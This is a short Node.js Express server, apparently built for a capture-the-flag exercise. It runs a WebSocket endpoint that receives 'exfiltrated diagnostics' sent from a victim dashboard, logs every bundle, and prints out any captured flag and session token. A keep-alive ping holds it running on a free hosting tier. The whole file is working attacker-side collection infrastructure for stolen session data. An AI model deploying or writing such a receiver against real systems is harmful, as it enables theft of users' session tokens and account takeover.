const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;

// ── GET / ── Status page (keeps Render awake) ──
app.get('/', (req, res) => {
  res.type('text').send('Nexus WS receiver is running');
});

// ── WS /ws ── Receive exfiltrated diagnostics from dashboard ──
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip, 'at', new Date().toISOString());

  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });

  ws.on('error', (err) => console.log('[ws] error:', err.message));
  ws.on('close', (code, reason) => console.log('[ws] closed, code:', code));
});

// ── Keep-alive ping (prevents Render free tier sleep) ──
setInterval(() => {
  console.log('[ping]', new Date().toISOString());
}, 300000); // every 5 min

app.listen(PORT, () => {
  console.log('WS Receiver listening on port', PORT);
});
